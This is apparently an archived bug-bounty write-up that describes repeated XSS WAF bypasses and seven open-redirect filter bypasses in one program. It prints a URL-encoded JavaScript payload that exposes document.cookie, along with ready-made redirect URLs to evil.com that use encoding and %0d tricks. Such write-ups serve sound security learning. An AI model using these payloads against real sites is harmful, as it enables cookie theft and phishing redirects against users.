# Discovering 7 Open Redirect Bypasses and 3 XSS Bypasses Within a Single Program Using Same…

- **Source URL:** https://0xm5awy.medium.com/discovering-7-open-redirect-bypasses-and-3-xss-bypasses-within-a-single-program-using-same-8e87581e1a75?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126142606/https://0xm5awy.medium.com/discovering-7-open-redirect-bypasses-and-3-xss-bypasses-within-a-single-program-using-same-8e87581e1a75
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3946 (id 3946)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
--

### **Discovering 7 Open Redirect Bypasses and 3 XSS Bypasses Within a Single Program Using the Same Parameters**

In today’s Write-up, I will share my journey of uncovering 7 open redirects and 3 XSS WAF (Web Application Firewall) bypasses within 1 program, all using the same parameters. The process unfolded as follows: I would report a vulnerability, they’d promptly fix it and reward me. However, I continued to bypass their fixes and reported the issues anew, repeating this cycle until I successfully uncovered 7 open redirects and 3 XSS WAF bypasses. Join me as we delve into the details of these vulnerabilities

*Part 1: Bypassing WAF to Execute XSS*


Cross-Site Scripting (XSS) is a serious web vulnerability that allows attackers to inject malicious scripts into web applications viewed by other users. WAFs are designed to detect and block such attacks, but determined attackers can find ways to bypass these security measures.

### ***Payload Used:***

javascript%3Avar%7Ba%3Aonerror%7D%3D%7Ba%3Aalert%7D%3Bthrow%2520document.cookie

1. XSS Bypass via External Link

- URL: `https://www.0xm5awy.com/link/out?ext=payload`
- By crafting URLs with parameters like “ext=payload,” attackers may attempt to bypass the WAF’s detection mechanisms by disguising the payload.

2\. XSS Bypass Through Login Page:

- URL: `https://www.0xm5awy.com/login?lastUrl=payload`
- Attackers can manipulate the “lastUrl” parameter to include malicious payloads, aiming to trick the WAF into allowing the XSS attack.

3\. XSS Bypass via Complete Profile Page:

- URL: `https://www.0xm5awy.com/complete-profile?r=payload`
- Similarly, the “r” parameter can be manipulated to smuggle XSS payloads and bypass the WAF.

*Part 2: Bypassing Filters in Redirection Attacks*


Redirection attacks involve tricking users into visiting malicious websites or domains. WAFs often employ filters to block potentially harmful redirections, but attackers can employ clever techniques to evade detection.

1. No Filter:

- URL: `https://www.0xm5awy.com/login?lastUrl=https://www.evil.com`
- Attackers can pass a domain like “evil.com” and it will Redirect it without any problems

2\. Bypass the filter check useing domain name:

- URL: `https://www.0xm5awy.com/login?lastUrl=https://attacker-0xm5awy.com`
- Attackers may use subdomains to appear legitimate while bypassing domain name checks.

3\. Bypass the filter if it only allows you to control the path using a nullbyte (1):

- URL: `https://www.0xm5awy.com/login?lastUrl=/%0d/evil.com`
- Incorporating nullbytes (%0d) in URLs can confuse the filter and allow attackers to execute redirections.

4\. Bypass the filter if it only allows you to control the path (2):

- URL: `https://www.0xm5awy.com/verify/notification?r=/%0d/evil.com`
- Incorporating nullbytes (%0d) in URLs can confuse the filter and allow attackers to execute redirections.

5\. Bypass the filter if it only checks for domain name using a dot:

- URL: `https://www.0xm5awy.com/verify/notification?i=&r=/%0D/evil%25%32%65com`
- Attackers can manipulate character encoding to bypass filters, even when using special characters.

6\. Domain Substitution:

- URL: `https://api.0xm5awy.com/verify/key/register?i=&r=-evil.com`
- By appending a hyphen, attackers can trick filters into allowing potentially malicious domains.

7\. Bypassing Using Dot in Domain:

- URL: `https://api.0xm5awy.com/verify/key/magic-link?i==&r=.evil.com`
- This technique involves using a dot to obscure malicious intent and bypass security checks.
